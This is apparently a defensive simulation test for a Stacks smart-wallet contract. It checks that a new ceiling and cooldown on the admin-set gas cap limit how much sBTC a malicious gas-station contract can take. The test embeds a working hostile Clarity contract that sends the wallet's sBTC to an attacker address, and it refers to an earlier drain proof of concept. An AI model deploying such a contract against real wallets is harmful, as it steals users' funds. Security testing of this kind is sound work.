// simul-max-gas-cooldown-v11.js
// The NEW code in juice-safe-v2 / fakfun-wallet-v11: max-gas-amount is no
// longer an instant admin knob. It is now
//   propose-max-gas-amount  (admin, <= MAX-GAS-CEILING u10000)
//   confirm-max-gas-amount  (admin, only after the wallet cooldown)
//
// This exists because the <gas-trait> contract is caller-supplied and NOT bound
// by the signed hash, and the gas path never consults
// would-exceed-sbtc-threshold. Previously a compromised admin could raise the
// cap silently and instantly, and the next gasless action would leak the lot to
// a hostile station. PoC against v1:
// https://stxer.xyz/simulations/mainnet/bf0a97e5584c479e15242447dec7d485
//
// Run against the DEPLOYED fakfun-wallet-v11. Nothing is redeployed.
// v11 onboards differently from juice-safe-v2: onboard(pubkey) seats the burn
// address, then propose/accept/confirm-admin (with a 432-block pubkey cooldown)
// seats the real admin. Only then can propose-max-gas-amount be called.
//   node simul-max-gas-cooldown-v11.js
import crypto from "node:crypto";
import {
  tupleCV, uintCV, bufferCV, noneCV, someCV, principalCV, standardPrincipalCV,
  stringAsciiCV, contractPrincipalCV, serializeCV, deserializeCV, cvToString,
  ClarityVersion, PostConditionMode,
} from "@stacks/transactions";
import { SimulationBuilder, getSimulationResult } from "stxer";
import { generateP256Keypair, signChallengeWithRpId } from "./lib-webauthn-test-signer.mjs";

const D = "SPV9K21TBFAK4KNRJXF5DFP8N7W46G4V9RCJDC22";
const FAKFUN_DEPLOYER = "SP28MP1HQDJWQAFSQJN2HBAXBVP7H7THD1W2NYZVK";
const OWNER = "SP2C7BCAP2NH3EYWCCVHJ6K0DMZBXDFKQ56KR7QN2";
const RECOVERY = "SP3HXJJMJQ06GNAZ8XWDN1QM48JEDC6PP6W3YZPZJ";
const RELAYER = "SP102V8P0F7JX67ARQ77WEA3D3CFB5XW39REDT0AM";
const ATTACKER = "SP1MGH8BH1KRY49Z7EE5TY0JVKT6C3NT9RTVM8FND";
const STX_WHALE = "SP9BP4PN74CNR5XT7CMAMBPA0GWC9HMB69HVVV51";
const SBTC = "SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4.sbtc-token";
const WALLET = `${D}.fakfun-wallet-v11`;
const CORE = `${D}.fakfun-wallet-core`;
const API = "http://77.42.3.101/stacks-api";
const RP_ID = "fak.fun";   // v11 whitelists fak.fun / fakfun.com

const CEILING = 10_000;      // MAX-GAS-CEILING
const OVER_CEILING = 20_000; // must be rejected outright
const NEW_CAP = 5_000;       // legal, still needs the cooldown
const SBTC_FUND = 500_000;

// The same hostile station used against v1 -- it now cannot take more than
// whatever max-gas-amount is, and that is ceilinged.
const EVIL = `(impl-trait '${D}.gas-station-trait.gas-station-trait)
(define-public (get-gas-amount) (ok u${NEW_CAP}))
(define-public (pay-gas)
  (contract-call? '${SBTC} transfer u${NEW_CAP} contract-caller '${ATTACKER} none))
(define-public (pay-gas-with-pyth)
  (contract-call? '${SBTC} transfer u${NEW_CAP} contract-caller '${ATTACKER} none))`;

const P = Buffer.from("534950303138", "hex");
const sha256 = (b) => crypto.createHash("sha256").update(b).digest();
const cvh = (cv) => { const o = serializeCV(cv); return typeof o === "string" ? sha256(Buffer.from(o, "hex")) : sha256(Buffer.from(o)); };
const dom = () => cvh(tupleCV({ name: stringAsciiCV("smart-wallet-standard"), version: stringAsciiCV("1.0.0"), "chain-id": uintCV(1), wallet: principalCV(WALLET) }));
const chal = (t) => sha256(Buffer.concat([P, dom(), cvh(t)]));
const tStake = (id, amt) => tupleCV({ topic: stringAsciiCV("stake-stx-juice-pox5"), "auth-id": uintCV(id), "amount-ustx": uintCV(amt) });
const strip = (h) => (h.startsWith("0x") ? h.slice(2) : h);
const sa = (id, pk, s) => tupleCV({ "auth-id": uintCV(id), pubkey: bufferCV(Buffer.from(strip(pk), "hex")), signature: bufferCV(Buffer.from(strip(s.signatureHex), "hex")), "authenticator-data": bufferCV(Buffer.from(strip(s.authenticatorDataHex), "hex")), "client-data-prefix": bufferCV(Buffer.from(strip(s.clientDataPrefixHex), "hex")), "client-data-suffix": bufferCV(Buffer.from(strip(s.clientDataSuffixHex), "hex")) });

const key = generateP256Keypair();
const pubkeyCV = bufferCV(Buffer.from(strip(key.pubKeyHex), "hex"));
const tAddAdmin = (id, a) => tupleCV({ topic: stringAsciiCV("add-admin"), "auth-id": uintCV(id), "new-admin": standardPrincipalCV(a) });
const tConfirmAdmin = (id, a) => tupleCV({ topic: stringAsciiCV("confirm-admin"), "auth-id": uintCV(id), "new-admin": standardPrincipalCV(a) });
const sigStake = signChallengeWithRpId(chal(tStake(1, 100_000_000)), key.privKey, RP_ID);
const sigPropose = signChallengeWithRpId(chal(tAddAdmin(9, OWNER)), key.privKey, RP_ID);
const sigConfirm = signChallengeWithRpId(chal(tConfirmAdmin(10, OWNER)), key.privKey, RP_ID);

const plan = [];
const b = SimulationBuilder.new({ stacksNodeAPI: API });
const call = (l, snd, cid, fn, args, exp) => { b.withSender(snd).addContractCall({ contract_id: cid, function_name: fn, function_args: args, post_condition_mode: PostConditionMode.Allow }); plan.push({ l, exp }); };
const ev = (l, code, cap) => { b.addEvalCode(WALLET, code); plan.push({ l, cap, ev: true }); };
const ok = /^\(ok/;

b.withSender(D).addContractDeploy({ contract_name: "zz-evil-gas-3", source_code: EVIL, clarity_version: ClarityVersion.Clarity5 });
plan.push({ l: "deploy the hostile gas station" });
call("set-verified-contract", D, CORE, "set-verified-contract", [principalCV(WALLET), noneCV()], ok);
call("onboard(pubkey)", FAKFUN_DEPLOYER, WALLET, "onboard", [pubkeyCV], ok);
call("propose-admin-with-signature(OWNER) (PASSKEY)", RELAYER, WALLET,
  "propose-admin-with-signature",
  [standardPrincipalCV(OWNER), sa(9, key.pubKeyHex, sigPropose), noneCV()], ok);
call("accept-admin-proposal (from OWNER)", OWNER, WALLET, "accept-admin-proposal", [], ok);
b.addAdvanceBlocks({ bitcoin_blocks: 440, stacks_blocks_per_bitcoin: 1 });
plan.push({ l: "advance 440 (pubkey cooldown u432)" });
call("confirm-admin-with-signature (PASSKEY) -> admin seated", RELAYER, WALLET,
  "confirm-admin-with-signature", [sa(10, key.pubKeyHex, sigConfirm), noneCV()], ok);
b.withSender(STX_WHALE).addSTXTransfer({ recipient: WALLET, amount: 500_000_000 });
plan.push({ l: "fund 500 STX" });
call(`fund ${SBTC_FUND} sats sBTC`, OWNER, SBTC, "transfer",
  [uintCV(SBTC_FUND), standardPrincipalCV(OWNER), principalCV(WALLET), noneCV()], ok);

ev("default max-gas-amount", "(var-get max-gas-amount)", "g0");

// --- the ceiling ---------------------------------------------------------
call(`G1 propose ${OVER_CEILING} (> ceiling u${CEILING}) -> u4018`, OWNER, WALLET,
  "propose-max-gas-amount", [uintCV(OVER_CEILING)], "(err u4018)");
call("G2 propose by a RANDOM principal -> u4001", ATTACKER, WALLET,
  "propose-max-gas-amount", [uintCV(NEW_CAP)], "(err u4001)");
call("G3 confirm with nothing proposed -> u4016", OWNER, WALLET,
  "confirm-max-gas-amount", [], "(err u4016)");

// --- the cooldown --------------------------------------------------------
call(`G4 propose ${NEW_CAP} (legal) -> ok`, OWNER, WALLET,
  "propose-max-gas-amount", [uintCV(NEW_CAP)], ok);
ev("max-gas-amount right after propose (must be UNCHANGED)", "(var-get max-gas-amount)", "g1");
ev("pending-max-gas", "(get-pending-max-gas)", "pend");
call("G5 confirm BEFORE the cooldown -> u4012", OWNER, WALLET,
  "confirm-max-gas-amount", [], "(err u4012)");

// the drain must still be capped at the OLD value while the raise is pending
ev("attacker sBTC before", `(contract-call? '${SBTC} get-balance '${ATTACKER})`, "a0");
call("G6 hostile gas station DURING the cooldown", RELAYER, WALLET, "stake-stx-juice",
  [uintCV(100_000_000), someCV(sa(1, key.pubKeyHex, sigStake)),
   someCV(contractPrincipalCV(D, "zz-evil-gas-3"))], /.*/);
ev("attacker sBTC after", `(contract-call? '${SBTC} get-balance '${ATTACKER})`, "a1");

b.addAdvanceBlocks({ bitcoin_blocks: 150, stacks_blocks_per_bitcoin: 1 });
plan.push({ l: "advance 150 (past the u144 cooldown)" });
call("G7 confirm AFTER the cooldown -> ok", OWNER, WALLET, "confirm-max-gas-amount", [], ok);
ev("max-gas-amount after confirm", "(var-get max-gas-amount)", "g2");
ev("pending cleared", "(get-pending-max-gas)", "pend2");

const id = await b.run();
const url = `https://stxer.xyz/simulations/mainnet/${id}`;
console.log(`\n${url}\n`);
const res = await getSimulationResult(id);
const dtx = (s) => { const t = s?.Result?.Transaction; if (!t) return ""; return "Err" in t ? "ABORT" : cvToString(deserializeCV(t.Ok.result)); };
const dev = (s) => { const e = s?.Result?.Eval; return e && "Ok" in e ? cvToString(deserializeCV(e.Ok)) : "?"; };
let pass = 0, fail = 0; const cap = {};
res.steps.forEach((s, i) => {
  const p = plan[i]; if (!p) return;
  if (p.ev) { const v = dev(s); if (p.cap) cap[p.cap] = v; console.log(`INFO  ${p.l}: ${v}`); return; }
  const d = dtx(s);
  if (!p.exp) { console.log(`      ${p.l} -> ${d}`); return; }
  const good = p.exp instanceof RegExp ? p.exp.test(d) : d === p.exp;
  console.log(`${good ? "PASS" : "FAIL"}  ${p.l} -> ${d}`);
  good ? pass++ : fail++;
});
const u = (x) => BigInt((String(x).match(/u(\d+)/) || [])[1] ?? "-1");
console.log("\n--- state checks ---");
const chk = (l, c) => { console.log(`${c ? "PASS" : "FAIL"} ${l}`); c ? pass++ : fail++; };
chk("propose did NOT change max-gas-amount", u(cap.g1) === u(cap.g0));
chk("confirm after cooldown DID change it", u(cap.g2) === BigInt(NEW_CAP));
chk("pending cleared after confirm", /proposed-at u0/.test(String(cap.pend2)));
chk(`hostile station capped at the OLD ${cap.g0} during the cooldown`,
  u(cap.a1) - u(cap.a0) <= u(cap.g0));
console.log(`   attacker took ${u(cap.a1) - u(cap.a0)} sats while the raise was pending`);
console.log(`\n=== ${pass} passed, ${fail} failed ===\n${url}`);
